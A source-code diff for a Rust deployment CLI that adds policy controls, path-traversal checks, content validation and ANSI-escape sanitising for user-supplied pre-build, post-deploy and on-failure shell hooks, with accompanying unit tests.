@@ -21,12 +21,13 @@ use crate::cli::generator::compose::ComposeDefinition;
 use crate::cli::generator::dockerfile::DockerfileBuilder;
 use crate::cli::install_runner::{
     resolve_docker_registry_credentials, strategy_for, CommandExecutor, DeployContext,
-    DeployResult, ShellExecutor,
+    DeployResult, HookPolicy, ShellExecutor,
 };
 use crate::cli::progress;
 use crate::cli::stacker_client::{self, StackerClient};
 use crate::console::commands::CallableTrait;
 use crate::helpers::ip::extract_ipv4_from_text;
+use crate::helpers::security_validator::validate_shell_scripts;
 use crate::helpers::ssh_client;
 
 /// Default config filename.
@@ -71,10 +72,14 @@ fn resolve_ai_from_env_or_config(
         }
     }
 
-    if let Ok(endpoint) = std::env::var("STACKER_AI_ENDPOINT") {
-        if !endpoint.trim().is_empty() {
-            ai.endpoint = Some(endpoint);
-            ai.enabled = true;
+    // Only apply STACKER_AI_ENDPOINT env var for ollama/custom — openai
+    // and anthropic have well-known defaults that should not be overridden.
+    if matches!(ai.provider, AiProviderType::Ollama | AiProviderType::Custom) {
+        if let Ok(endpoint) = std::env::var("STACKER_AI_ENDPOINT") {
+            if !endpoint.trim().is_empty() {
+                ai.endpoint = Some(endpoint);
+                ai.enabled = true;
+            }
         }
     }
 
@@ -1628,6 +1633,7 @@ fn extract_host_port_from_string(spec: &str) -> Option<String> {
         return None;
     }
 
+    let protocol = trimmed.rsplit_once('/').map(|(_, proto)| proto.trim().to_lowercase());
     let without_protocol = trimmed.split('/').next().unwrap_or(trimmed);
     let parts: Vec<&str> = without_protocol.split(':').collect();
 
@@ -1635,10 +1641,16 @@ fn extract_host_port_from_string(spec: &str) -> Option<String> {
         return None;
     }
 
-    parts
+    let mut result = parts
         .get(parts.len().saturating_sub(2))
         .map(|part| part.trim().to_string())
-        .filter(|part| !part.is_empty())
+        .filter(|part| !part.is_empty())?;
+
+    if let Some(proto) = protocol {
+        result.push_str(&format!("/{}", proto));
+    }
+
+    Some(result)
 }
 
 /// Detect host-port collisions between stacker.yml `services:` and a user-supplied compose file.
@@ -2056,6 +2068,9 @@ fn merge_cloud_config_from_info(
         ssh_key: existing.and_then(|cloud| cloud.ssh_key.clone()),
         key: Some(cloud_info.name.clone()),
         server: existing.and_then(|cloud| cloud.server.clone()),
+        public_ports: existing
+            .map(|cloud| cloud.public_ports.clone())
+            .unwrap_or_default(),
     })
 }
 
@@ -2147,6 +2162,11 @@ pub struct DeployCommand {
     pub plan: bool,
     /// Revalidate and apply a previously generated plan fingerprint.
     pub apply_plan: Option<String>,
+    /// Skip every shell hook regardless of provenance (--no-hooks).
+    pub no_hooks: bool,
+    /// Run hooks even when the stacker.yml is marketplace-generated
+    /// (--allow-untrusted-hooks). No-op for user-authored files.
+    pub allow_untrusted_hooks: bool,
 }
 
 impl DeployCommand {
@@ -2173,6 +2193,23 @@ impl DeployCommand {
             runtime: "runc".to_string(),
             plan: false,
             apply_plan: None,
+            no_hooks: false,
+            allow_untrusted_hooks: false,
+        }
+    }
+
+    /// Builder method for --no-hooks / --allow-untrusted-hooks flags.
+    pub fn with_hook_flags(mut self, no_hooks: bool, allow_untrusted_hooks: bool) -> Self {
+        self.no_hooks = no_hooks;
+        self.allow_untrusted_hooks = allow_untrusted_hooks;
+        self
+    }
+
+    /// Resolve the DeployCommand's hook flags into a [`HookPolicy`].
+    pub fn hook_policy(&self) -> HookPolicy {
+        HookPolicy {
+            no_hooks: self.no_hooks,
+            allow_untrusted: self.allow_untrusted_hooks,
         }
     }
 
@@ -2276,7 +2313,12 @@ impl DeployCommand {
         // Find compose file: prefer deploy.compose_file from stacker.yml, else default.
         let compose_path = stacker_config
             .as_ref()
-            .and_then(|c| c.deploy.compose_file.as_deref().map(|f| project_dir.join(f)))
+            .and_then(|c| {
+                c.deploy
+                    .compose_file
+                    .as_deref()
+                    .map(|f| project_dir.join(f))
+            })
             .unwrap_or_else(|| project_dir.join("docker-compose.yml"));
 
         if !compose_path.exists() {
@@ -2314,20 +2356,19 @@ impl DeployCommand {
             .to_string();
 
         // Auto-inject default_network when the service is an NginxProxyManager upstream.
-        let compose_content =
-            if let Some(ref cfg) = stacker_config {
-                if crate::cli::compose_service_sync::inject_npm_proxy_network(
-                    &mut compose_doc,
-                    service,
-                    &cfg.proxy,
-                ) {
-                    serde_yaml::to_string(&compose_doc)?
-                } else {
-                    compose_content
-                }
+        let compose_content = if let Some(ref cfg) = stacker_config {
+            if crate::cli::compose_service_sync::inject_npm_proxy_network(
+                &mut compose_doc,
+                service,
+                &cfg.proxy,
+            ) {
+                serde_yaml::to_string(&compose_doc)?
             } else {
                 compose_content
-            };
+            }
+        } else {
+            compose_content
+        };
 
         let ctx = crate::cli::runtime::CliRuntime::new("deploy")?;
         let hash = resolve_deployment_hash(&None, &ctx)?;
@@ -2388,7 +2429,10 @@ impl DeployCommand {
                         Ok::<_, CliError>(())
                     });
                     if let Err(e) = registered {
-                        eprintln!("Warning: deployed successfully but app registration failed: {}", e);
+                        eprintln!(
+                            "Warning: deployed successfully but app registration failed: {}",
+                            e
+                        );
                     }
                 }
             }
@@ -2420,9 +2464,262 @@ pub struct RemoteDeployOverrides {
     pub server_name: Option<String>,
 }
 
+const HOOK_TIMEOUT: Duration = Duration::from_secs(300);
+
+/// Maximum bytes of hook stdout/stderr we relay to the terminal before
+/// truncating. Set at 1 MiB — comfortable for normal build output, small
+/// enough that a hostile hook can't blank the terminal / flood the pager /
+/// OOM the CLI. See audit M4.
+pub(crate) const HOOK_OUTPUT_MAX_BYTES: usize = 1_048_576;
+
+/// Suffix appended when `sanitize_hook_output` truncates. Users see this in
+/// their terminal; tests match on it verbatim. Keep it stable.
+pub(crate) const HOOK_OUTPUT_TRUNCATION_MARKER: &str =
+    "\n[stacker: hook output truncated to 1 MiB]";
+
+/// Strip terminal control sequences and cap length before we relay hook
+/// stdout/stderr to the user's terminal.
+///
+/// Attack surface (audit M4 + M5):
+///   * ANSI CSI (`ESC [ … final`) — cursor jumps, screen erase, colours.
+///   * ANSI OSC (`ESC ] … BEL` or `ESC ] … ESC \`) — set window title,
+///     hyperlink smuggling.
+///   * Single-char / two-byte ESC sequences (`ESC c`, `ESC 7`, etc.).
+///   * BEL / audible bell — harmless individually, but common in the
+///     tail of OSC sequences and worth dropping as a defensive measure.
+///
+/// This is intentionally hand-rolled — no crate dependency for what
+/// amounts to a few hundred lines of state machine.
+pub(crate) fn sanitize_hook_output(raw: &str) -> String {
+    let stripped = strip_ansi_sequences(raw);
+    if stripped.len() <= HOOK_OUTPUT_MAX_BYTES {
+        return stripped;
+    }
+    // Truncate at a UTF-8 char boundary at or below the cap.
+    let mut cutoff = HOOK_OUTPUT_MAX_BYTES;
+    while cutoff > 0 && !stripped.is_char_boundary(cutoff) {
+        cutoff -= 1;
+    }
+    let mut out = String::with_capacity(cutoff + HOOK_OUTPUT_TRUNCATION_MARKER.len());
+    out.push_str(&stripped[..cutoff]);
+    out.push_str(HOOK_OUTPUT_TRUNCATION_MARKER);
+    out
+}
+
+fn strip_ansi_sequences(raw: &str) -> String {
+    let mut out = String::with_capacity(raw.len());
+    let bytes = raw.as_bytes();
+    let mut i = 0;
+    while i < bytes.len() {
+        let b = bytes[i];
+        // Drop stray BEL — commonly used as OSC terminator; on its own
+        // it's just noise.
+        if b == 0x07 {
+            i += 1;
+            continue;
+        }
+        if b != 0x1b {
+            out.push(b as char);
+            i += 1;
+            continue;
+        }
+        // We're on ESC. Peek the next byte to classify.
+        let next = bytes.get(i + 1).copied();
+        match next {
+            // CSI: ESC [ params final. Final byte is 0x40..=0x7E,
+            // preceded by any number of params/intermediate bytes.
+            Some(b'[') => {
+                let mut j = i + 2;
+                while j < bytes.len() {
+                    let c = bytes[j];
+                    if (0x40..=0x7E).contains(&c) {
+                        j += 1; // consume the final byte
+                        break;
+                    }
+                    j += 1;
+                }
+                i = j;
+            }
+            // OSC: ESC ] payload (BEL | ESC \). We already strip BEL
+            // above, so we just scan until either BEL, ST (ESC \), or
+            // end of input.
+            Some(b']') => {
+                let mut j = i + 2;
+                while j < bytes.len() {
+                    let c = bytes[j];
+                    if c == 0x07 {
+                        j += 1;
+                        break;
+                    }
+                    if c == 0x1b && bytes.get(j + 1) == Some(&b'\\') {
+                        j += 2;
+                        break;
+                    }
+                    j += 1;
+                }
+                i = j;
+            }
+            // Two-byte ESC + intermediate (` ` through `/`) sequences,
+            // and ESC + single "F" final (`0`–`~`). Consume both.
+            Some(_) => {
+                i += 2;
+            }
+            None => {
+                // Lonely ESC at end of input — drop.
+                i += 1;
+            }
+        }
+    }
+    out
+}
+
+fn run_hook(
+    executor: &dyn CommandExecutor,
+    project_dir: &Path,
+    hook: &Option<PathBuf>,
+    hook_name: &str,
+    policy: HookPolicy,
+    origin_trusted: bool,
+) -> Result<(), CliError> {
+    if let Some(script) = hook {
+        // Policy guard 1: --no-hooks skips every hook unconditionally.
+        if policy.no_hooks {
+            eprintln!("  Hook ({}) skipped (--no-hooks)", hook_name);
+            return Ok(());
+        }
+
+        // Policy guard 2: marketplace-generated configs require an
+        // explicit --allow-untrusted-hooks opt-in. This is the C4
+        // defence: after `stacker install <template>` writes a
+        // stacker.yml with a hooks: block, running `stacker deploy` on
+        // that file must NOT execute hooks silently just because the
+        // user typed the deploy command.
+        if !origin_trusted && !policy.allow_untrusted {
+            return Err(CliError::HookRejected {
+                hook_name: hook_name.to_string(),
+                reason: format!(
+                    "this stacker.yml was generated by the marketplace and has not been \
+                     marked trusted. Review the hook script, then either remove the '{}' \
+                     marker line from the top of stacker.yml, or re-run with \
+                     --allow-untrusted-hooks. Use --no-hooks to skip all hooks.",
+                    crate::cli::config_parser::MARKETPLACE_ORIGIN_MARKER,
+                ),
+            });
+        }
+
+        let script_path = if script.is_absolute() {
+            script.clone()
+        } else {
+            project_dir.join(script)
+        };
+        if !script_path.exists() {
+            return Err(CliError::HookRejected {
+                hook_name: hook_name.to_string(),
+                reason: format!("script not found: {}", script_path.display()),
+            });
+        }
+
+        // Security: canonicalize the resolved path and reject traversal outside project_dir
+        let canonical = script_path
+            .canonicalize()
+            .map_err(|e| CliError::HookRejected {
+                hook_name: hook_name.to_string(),
+                reason: format!(
+                    "cannot canonicalize hook path '{}': {}",
+                    script_path.display(),
+                    e
+                ),
+            })?;
+        let project_canonical = project_dir
+            .canonicalize()
+            .unwrap_or_else(|_| project_dir.to_path_buf());
+        if !canonical.starts_with(&project_canonical) {
+            return Err(CliError::HookRejected {
+                hook_name: hook_name.to_string(),
+                reason: format!(
+                    "path '{}' resolves outside the project directory",
+                    script_path.display()
+                ),
+            });
+        }
+
+        eprintln!("  Hook ({}) running: {}", hook_name, canonical.display());
+
+        // Security: validate script content for malicious patterns (L3: cap size at 1 MB)
+        let script_content = std::fs::read(&script_path).ok().filter(|b| b.len() <= 1_048_576)
+            .and_then(|b| String::from_utf8(b).ok());
+        match script_content {
+            Some(content) => {
+                let validation = validate_shell_scripts(&[(hook_name, &content)]);
+                if !validation.passed {
+                    let critical: Vec<&str> = validation
+                        .details
+                        .iter()
+                        .filter(|d| d.starts_with("[CRITICAL]"))
+                        .map(|s| s.as_str())
+                        .collect();
+                    if !critical.is_empty() {
+                        return Err(CliError::HookRejected {
+                            hook_name: hook_name.to_string(),
+                            reason: format!(
+                                "rejected by security validation:\n  {}",
+                                critical.join("\n  ")
+                            ),
+                        });
+                    }
+                    for warning in validation.details.iter().filter(|d| d.starts_with("[WARNING]"))
+                    {
+                        eprintln!("  [WARN] Hook '{}': {}", hook_name, warning);
+                    }
+                }
+            }
+            None => {
+                eprintln!("  [WARN] Could not read (or too large) '{}' for validation", script_path.display());
+            }
+        }
+
+        let script_str = canonical.to_string_lossy().to_string();
+        let output = executor.execute_with_timeout(
+            "sh",
+            &[&script_str],
+            HOOK_TIMEOUT,
+            Some(project_dir),
+        )?;
+
+        // Phase 8 defence (audit M4 + M5): a hostile hook can dump
+        // gigabytes of stdout to OOM the CLI, or emit ANSI escape
+        // sequences to clear the terminal / fake a prompt / set the
+        // window title. Sanitize both channels before they touch the
+        // user's terminal. The size cap is enforced string-level here;
+        // the pipe-level cap is a job for ShellExecutor's spawn code.
+        if !output.stdout.is_empty() {
+            println!("{}", sanitize_hook_output(&output.stdout));
+        }
+        if !output.stderr.is_empty() {
+            eprintln!("{}", sanitize_hook_output(&output.stderr));
+        }
+        if !output.success() {
+            return Err(CliError::DeployFailed {
+                target: crate::cli::config_parser::DeployTarget::Local,
+                reason: format!(
+                    "Hook '{}' failed: {}",
+                    hook_name,
+                    sanitize_hook_output(output.stderr.trim())
+                ),
+            });
+        }
+        eprintln!("  Hook ({}) completed", hook_name);
+    }
+    Ok(())
+}
+
 /// Core deploy logic, extracted for testability.
 ///
 /// Takes injectable `CommandExecutor` so tests can mock shell calls.
+///
+/// Uses `HookPolicy::default()` — hooks are allowed for user-authored
+/// configs and refused for marketplace-generated ones. Use
+/// [`run_deploy_with_policy`] to override.
 #[allow(clippy::too_many_arguments)]
 pub fn run_deploy(
     project_dir: &Path,
@@ -2435,7 +2732,37 @@ pub fn run_deploy(
     remote_overrides: &RemoteDeployOverrides,
     runtime: &str,
 ) -> Result<DeployResult, CliError> {
-    run_deploy_for_environment(
+    run_deploy_with_policy(
+        project_dir,
+        config_file,
+        target_override,
+        dry_run,
+        force_rebuild,
+        force_new,
+        executor,
+        remote_overrides,
+        runtime,
+        HookPolicy::default(),
+    )
+}
+
+/// Like [`run_deploy`] but with an explicit [`HookPolicy`]. This is the
+/// hook-safe entry point used by the CLI when the user passes
+/// `--no-hooks` or `--allow-untrusted-hooks`.
+#[allow(clippy::too_many_arguments)]
+pub fn run_deploy_with_policy(
+    project_dir: &Path,
+    config_file: Option<&str>,
+    target_override: Option<&str>,
+    dry_run: bool,
+    force_rebuild: bool,
+    force_new: bool,
+    executor: &dyn CommandExecutor,
+    remote_overrides: &RemoteDeployOverrides,
+    runtime: &str,
+    hook_policy: HookPolicy,
+) -> Result<DeployResult, CliError> {
+    run_deploy_for_environment_with_policy(
         project_dir,
         config_file,
         target_override,
@@ -2446,6 +2773,7 @@ pub fn run_deploy(
         executor,
         remote_overrides,
         runtime,
+        hook_policy,
     )
 }
 
@@ -2462,6 +2790,35 @@ pub fn run_deploy_for_environment(
     remote_overrides: &RemoteDeployOverrides,
     runtime: &str,
 ) -> Result<DeployResult, CliError> {
+    run_deploy_for_environment_with_policy(
+        project_dir,
+        config_file,
+        target_override,
+        environment_override,
+        dry_run,
+        force_rebuild,
+        force_new,
+        executor,
+        remote_overrides,
+        runtime,
+        HookPolicy::default(),
+    )
+}
+
+#[allow(clippy::too_many_arguments)]
+pub fn run_deploy_for_environment_with_policy(
+    project_dir: &Path,
+    config_file: Option<&str>,
+    target_override: Option<&str>,
+    environment_override: Option<&str>,
+    dry_run: bool,
+    force_rebuild: bool,
+    force_new: bool,
+    executor: &dyn CommandExecutor,
+    remote_overrides: &RemoteDeployOverrides,
+    runtime: &str,
+    hook_policy: HookPolicy,
+) -> Result<DeployResult, CliError> {
     let cred_manager = CredentialsManager::with_default_store();
     run_deploy_with_credentials_manager(
         project_dir,
@@ -2475,6 +2832,7 @@ pub fn run_deploy_for_environment(
         remote_overrides,
         runtime,
         &cred_manager,
+        hook_policy,
     )
 }
 
@@ -2491,6 +2849,7 @@ fn run_deploy_with_credentials_manager<S: CredentialStore>(
     remote_overrides: &RemoteDeployOverrides,
     runtime: &str,
     cred_manager: &CredentialsManager<S>,
+    hook_policy: HookPolicy,
 ) -> Result<DeployResult, CliError> {
     // 1. Load config
     let config_path = match config_file {
@@ -2528,6 +2887,20 @@ fn run_deploy_with_credentials_manager<S: CredentialStore>(
     let mut lock_server_name: Option<String> = None;
     if deploy_target == DeployTarget::Cloud && !force_new {
         if let Some(ref server_cfg) = config.deploy.server {
+            if crate::helpers::ip::is_private_host(&server_cfg.host) {
+                // Private/intranet host — skip SSH check and switch to Server target.
+                // The russh client cannot reliably reach intranet IPs from the CLI's
+                // routing stack (EHOSTUNREACH), but the local SSH binary can. Trust
+                // the config and proceed.
+                eprintln!(
+                    "  Found deploy.server section (host={}). Intranet address — skipping SSH pre-check.",
+                    server_cfg.host
+                );
+                eprintln!(
+                    "  Switching deploy target from 'cloud' → 'server' (intranet server)."
+                );
+                deploy_target = DeployTarget::Server;
+            } else {
             eprintln!(
                 "  Found deploy.server section (host={}). Checking SSH connectivity...",
                 server_cfg.host
@@ -2589,6 +2962,7 @@ fn run_deploy_with_credentials_manager<S: CredentialStore>(
                     });
                 }
             }
+            }
         } else if DeploymentLock::exists_for_target(project_dir, "cloud")
             || DeploymentLock::exists(project_dir)
         {
@@ -2641,48 +3015,59 @@ fn run_deploy_with_credentials_manager<S: CredentialStore>(
 
     if deploy_target == DeployTarget::Server {
         if let Some(ref server_cfg) = config.deploy.server {
-            eprintln!(
-                "  Validating SSH connectivity to {} before bootstrap deploy...",
-                server_cfg.host
-            );
+            if crate::helpers::ip::is_private_host(&server_cfg.host) {
+                // Intranet / private-IP servers are not reachable from the cloud,
+                // so the russh pre-check will always fail (EHOSTUNREACH on the CLI
+                // machine's routing stack may differ from the system SSH). Skip it
+                // and proceed directly — the user configured this server themselves.
+                eprintln!(
+                    "  Skipping SSH pre-check for intranet server {} (private address).",
+                    server_cfg.host
+                );
+            } else {
+                eprintln!(
+                    "  Validating SSH connectivity to {} before bootstrap deploy...",
+                    server_cfg.host
+                );
 
-            match try_ssh_server_check(server_cfg) {
-                Some(check) if check.connected && check.authenticated => {
-                    eprintln!(
-                        "  ✓ Server {} is reachable ({})",
-                        server_cfg.host,
-                        check.summary()
-                    );
+                match try_ssh_server_check(server_cfg) {
+                    Some(check) if check.connected && check.authenticated => {
+                        eprintln!(
+                            "  ✓ Server {} is reachable ({})",
+                            server_cfg.host,
+                            check.summary()
+                        );
 
-                    if !check.docker_installed {
+                        if !check.docker_installed {
+                            return Err(CliError::DeployFailed {
+                                target: DeployTarget::Server,
+                                reason: format!(
+                                    "Server {} is reachable but Docker is not installed. Install Docker and Docker Compose, then retry.",
+                                    server_cfg.host
+                                ),
+                            });
+                        }
+                    }
+                    Some(check) => {
+                        print_server_unreachable_hint(server_cfg, &check);
                         return Err(CliError::DeployFailed {
                             target: DeployTarget::Server,
                             reason: format!(
-                                "Server {} is reachable but Docker is not installed. Install Docker and Docker Compose, then retry.",
+                                "Failed to connect to {} over SSH: {}",
+                                server_cfg.host,
+                                check.error.as_deref().unwrap_or("unknown error")
+                            ),
+                        });
+                    }
+                    None => {
+                        return Err(CliError::DeployFailed {
+                            target: DeployTarget::Server,
+                            reason: format!(
+                                "Could not verify SSH connectivity to {}. Check deploy.server.ssh_key and retry.",
                                 server_cfg.host
                             ),
                         });
                     }
-                }
-                Some(check) => {
-                    print_server_unreachable_hint(server_cfg, &check);
-                    return Err(CliError::DeployFailed {
-                        target: DeployTarget::Server,
-                        reason: format!(
-                            "Failed to connect to {} over SSH: {}",
-                            server_cfg.host,
-                            check.error.as_deref().unwrap_or("unknown error")
-                        ),
-                    });
-                }
-                None => {
-                    return Err(CliError::DeployFailed {
-                        target: DeployTarget::Server,
-                        reason: format!(
-                            "Could not verify SSH connectivity to {}. Check deploy.server.ssh_key and retry.",
-                            server_cfg.host
-                        ),
-                    });
                 }
             }
         }
@@ -2894,6 +3279,12 @@ fn run_deploy_with_credentials_manager<S: CredentialStore>(
         if let Some(ref pre_build) = config.hooks.pre_build {
             eprintln!("  Hook (pre_build): {}", pre_build.display());
         }
+        if let Some(ref post_deploy) = config.hooks.post_deploy {
+            eprintln!("  Hook (post_deploy): {}", post_deploy.display());
+        }
+        if let Some(ref on_failure) = config.hooks.on_failure {
+            eprintln!("  Hook (on_failure): {}", on_failure.display());
+        }
     }
 
     // 6. Deploy
@@ -2917,9 +3308,96 @@ fn run_deploy_with_credentials_manager<S: CredentialStore>(
         force_new,
     };
 
-    let result = strategy.deploy(&config, &context, executor)?;
+    let origin_trusted = config.is_trusted();
 
-    Ok(result)
+    // 6a. Execute pre-build hook
+    if !dry_run {
+        run_hook(
+            executor,
+            project_dir,
+            &config.hooks.pre_build,
+            "pre_build",
+            hook_policy,
+            origin_trusted,
+        )?;
+    }
+
+    // 6b. Deploy
+    let deploy_result = strategy.deploy(&config, &context, executor);
+
+    match deploy_result {
+        Ok(result) => {
+            // 6c. Execute post-deploy hook on success.
+            //
+            // Phase 6b split: distinguish security REJECTION from runtime
+            // FAILURE. A rejection (path traversal, malicious content,
+            // untrusted origin) must fail the deploy — otherwise a hostile
+            // stacker.yml can silently succeed while the tell-tale WARN
+            // scrolls off the terminal. A clean-content hook that just
+            // exits non-zero at runtime stays best-effort (WARN + Ok).
+            if !dry_run {
+                match run_hook(
+                    executor,
+                    project_dir,
+                    &config.hooks.post_deploy,
+                    "post_deploy",
+                    hook_policy,
+                    origin_trusted,
+                ) {
+                    Ok(()) => {}
+                    Err(err @ CliError::HookRejected { .. }) => {
+                        eprintln!("  [ERROR] {}", err);
+                        return Err(err);
+                    }
+                    Err(err) => {
+                        eprintln!("  [WARN] post_deploy hook failed: {}", err);
+                    }
+                }
+            }
+            Ok(result)
+        }
+        Err(err) => {
+            // 6d. Execute on-failure hook.
+            //
+            // Phase 6b: runtime failure of on_failure is a WARN and the
+            // original deploy error is preserved. Security rejection of
+            // on_failure is escalated by chaining the rejection reason
+            // into the returned error, so the operator sees BOTH the
+            // primary cause AND the fact that a hostile cleanup script
+            // was refused.
+            if !dry_run {
+                match run_hook(
+                    executor,
+                    project_dir,
+                    &config.hooks.on_failure,
+                    "on_failure",
+                    hook_policy,
+                    origin_trusted,
+                ) {
+                    Ok(()) => {}
+                    Err(hook_err @ CliError::HookRejected { .. }) => {
+                        let rejection_text = format!("{}", hook_err);
+                        eprintln!("  [ERROR] {}", rejection_text);
+                        let chained = match err {
+                            CliError::DeployFailed { target, reason } => CliError::DeployFailed {
+                                target,
+                                reason: format!("{}\n\n{}", reason, rejection_text),
+                            },
+                            other => CliError::DeployFailed {
+                                target: crate::cli::config_parser::DeployTarget::Local,
+                                reason: format!("{}\n\n{}", other, rejection_text),
+                            },
+                        };
+                        return Err(chained);
+                    }
+                    Err(hook_err) => {
+                        eprintln!("  [WARN] on_failure hook also failed: {}", hook_err);
+                    }
+                }
+            }
+            Err(err)
+        }
+    }
 }
 
 impl CallableTrait for DeployCommand {
@@ -2983,7 +3461,7 @@ impl CallableTrait for DeployCommand {
         // ── Spinner while deploying ──────────────────
         let spin = progress::deploy_spinner("starting...");
 
-        let result = run_deploy_for_environment(
+        let result = run_deploy_for_environment_with_policy(
             &project_dir,
             self.file.as_deref(),
             self.target.as_deref(),
@@ -2994,6 +3472,7 @@ impl CallableTrait for DeployCommand {
             &executor,
             &remote_overrides,
             &self.runtime,
+            self.hook_policy(),
         );
 
         let result = match result {
@@ -3038,6 +3517,29 @@ impl CallableTrait for DeployCommand {
                         self.file.as_deref(),
                         self.target.as_deref(),
                     )?;
+                }
+
+                // Show platform features available to the user
+                let creds_path = std::env::var("XDG_CONFIG_HOME")
+                    .map(std::path::PathBuf::from)
+                    .or_else(|_| std::env::var("HOME").map(|h| std::path::PathBuf::from(h).join(".config")))
+                    .map(|b| b.join("stacker/credentials.json"))
+                    .unwrap_or_default();
+                let logged_in = std::env::var("STACKER_TOKEN").is_ok()
+                    || creds_path.exists();
+
+                if !logged_in {
+                    eprintln!(
+                        "\n  Create a free account to deploy anywhere:\n\
+                           stacker login\n\
+                           (Free tier: 20 deploys/mo, 1 cloud provider — no credit card)"
+                    );
+                } else {
+                    eprintln!(
+                        "\n  Deploy to production:\n\
+                           stacker config setup cloud    (Hetzner $4/mo, 5 min setup)\n\
+                           stacker deploy --target cloud"
+                    );
                 }
             }
             DeployTarget::Cloud | DeployTarget::Server if should_watch => {
@@ -4278,6 +4780,7 @@ services:
             &RemoteDeployOverrides::default(),
             "runc",
             &cred_manager,
+            HookPolicy::default(),
         );
         assert!(result.is_err());
 
@@ -4343,6 +4846,7 @@ services:
             &RemoteDeployOverrides::default(),
             "runc",
             &cred_manager,
+            HookPolicy::default(),
         );
         assert!(result.is_err());
 
@@ -4473,13 +4977,13 @@ services:
     }
 
     #[test]
-    fn test_deploy_runs_pre_build_hook_noted() {
+    fn test_deploy_hooks_dry_run_does_not_execute() {
         let config =
-            "name: test-app\napp:\n  type: static\n  path: .\nhooks:\n  pre_build: ./build.sh\n";
+            "name: test-app\napp:\n  type: static\n  path: .\nhooks:\n  pre_build: ./build.sh\n  post_deploy: ./post.sh\n  on_failure: ./failure.sh\n";
         let dir = setup_local_project(&[("index.html", "<h1>hello</h1>"), ("stacker.yml", config)]);
         let executor = MockExecutor::success();
 
-        // Dry-run should succeed (hooks are just noted, not executed in dry-run)
+        // Dry-run should succeed (hooks noted but NOT executed — no scripts created)
         let result = run_deploy(
             dir.path(),
             None,
@@ -4492,6 +4996,103 @@ services:
             "runc",
         );
         assert!(result.is_ok());
+    }
+
+    #[test]
+    fn test_deploy_runs_pre_build_hook() {
+        let config =
+            "name: test-app\napp:\n  type: static\n  path: .\n  ports:\n    - \"8080\"\nhooks:\n  pre_build: ./build.sh\n";
+        let dir = setup_local_project(&[
+            ("index.html", "<h1>hello</h1>"),
+            ("stacker.yml", config),
+            ("build.sh", "#!/bin/sh\necho pre-build\necho done > done.txt"),
+        ]);
+        let executor = MockExecutor::success();
+
+        // Non-dry-run — hook should be executed
+        let result = run_deploy(
+            dir.path(),
+            None,
+            Some("local"),
+            false,
+            false,
+            false,
+            &executor,
+            &RemoteDeployOverrides::default(),
+            "runc",
+        );
+        assert!(result.is_ok());
+
+        // Verify the hook script was invoked through the executor
+        let calls = executor.calls.lock().unwrap();
+        let hook_calls: Vec<_> = calls.iter().filter(|(prog, _)| prog == "sh").collect();
+        assert!(!hook_calls.is_empty(), "Expected at least one sh call for the hook");
+        assert!(
+            hook_calls.iter().any(|(_, args)| args.iter().any(|a| a.contains("build.sh"))),
+            "Expected a sh call with build.sh in args"
+        );
+    }
+
+    #[test]
+    fn test_deploy_runs_post_deploy_hook_on_success() {
+        let config =
+            "name: test-app\napp:\n  type: static\n  path: .\n  ports:\n    - \"8080\"\nhooks:\n  post_deploy: ./post.sh\n";
+        let dir = setup_local_project(&[
+            ("index.html", "<h1>hello</h1>"),
+            ("stacker.yml", config),
+            ("post.sh", "#!/bin/sh\necho post-deploy"),
+        ]);
+        let executor = MockExecutor::success();
+
+        let result = run_deploy(
+            dir.path(),
+            None,
+            Some("local"),
+            false,
+            false,
+            false,
+            &executor,
+            &RemoteDeployOverrides::default(),
+            "runc",
+        );
+        assert!(result.is_ok());
+
+        // Verify the hook script was invoked through the executor
+        let calls = executor.calls.lock().unwrap();
+        let hook_calls: Vec<_> = calls.iter().filter(|(prog, _)| prog == "sh").collect();
+        assert!(!hook_calls.is_empty(), "Expected at least one sh call for post_deploy");
+        assert!(
+            hook_calls.iter().any(|(_, args)| args.iter().any(|a| a.contains("post.sh"))),
+            "Expected a sh call with post.sh in args"
+        );
+    }
+
+    #[test]
+    fn test_deploy_hook_missing_script_fails() {
+        let config =
+            "name: test-app\napp:\n  type: static\n  path: .\nhooks:\n  pre_build: ./nonexistent.sh\n";
+        let dir = setup_local_project(&[("index.html", "<h1>hello</h1>"), ("stacker.yml", config)]);
+        let executor = MockExecutor::success();
+
+        let result = run_deploy(
+            dir.path(),
+            None,
+            Some("local"),
+            false,
+            false,
+            false,
+            &executor,
+            &RemoteDeployOverrides::default(),
+            "runc",
+        );
+        assert!(result.is_err(), "Deploy should fail when hook script is missing");
+        let err = result.unwrap_err();
+        let err_str = format!("{}", err);
+        assert!(
+            err_str.contains("nonexistent.sh"),
+            "Error should mention the missing script: {}",
+            err_str
+        );
     }
 
     #[test]
@@ -4774,6 +5375,7 @@ include:
             ssh_key: None,
             key: None,
             server: None,
+            public_ports: Vec::new(),
         };
         let cloud = stacker_client::CloudInfo {
             id: 5,
@@ -5363,8 +5965,8 @@ monitoring:
     // These tests verify the compose-mutation step that deploy_single_service
     // performs before sending compose content to the agent.
 
-    use crate::cli::config_parser::{DomainConfig, ProxyConfig, ProxyType, SslMode};
     use crate::cli::compose_service_sync::inject_npm_proxy_network;
+    use crate::cli::config_parser::{DomainConfig, ProxyConfig, ProxyType, SslMode};
 
     fn npm_proxy_for(upstream: &str) -> ProxyConfig {
         ProxyConfig {
@@ -5381,7 +5983,8 @@ monitoring:
 
     #[test]
     fn deploy_single_service_compose_injection_adds_default_network_for_proxied_service() {
-        let compose_yaml = "services:\n  api:\n    image: myapp:latest\n    ports:\n      - \"3000:3000\"\n";
+        let compose_yaml =
+            "services:\n  api:\n    image: myapp:latest\n    ports:\n      - \"3000:3000\"\n";
         let mut doc: serde_yaml::Value = serde_yaml::from_str(compose_yaml).unwrap();
 
         let changed = inject_npm_proxy_network(&mut doc, "api", &npm_proxy_for("api:3000"));
@@ -5425,5 +6028,983 @@ monitoring:
 
         let changed = inject_npm_proxy_network(&mut doc, "web", &proxy);
         assert!(!changed);
+    }
+
+    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    // Security-audit follow-up tests — shell hook execution.
+    //
+    // These tests are written FIRST (TDD): they encode the intended
+    // post-fix behaviour and MUST fail against the current code.
+    // The fixes in `run_hook` (deploy.rs) + new path/content validators
+    // flip them to green.
+    //
+    // Coverage:
+    //   * C3 — path traversal / absolute / symlink rejected
+    //   * C1 — validate_shell_scripts wired into pre_build, post_deploy,
+    //          and on_failure paths
+    //   * H1 — post_deploy / on_failure hook failures no longer swallowed
+    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+    /// Mock executor that returns a non-zero exit when invoked with `sh`.
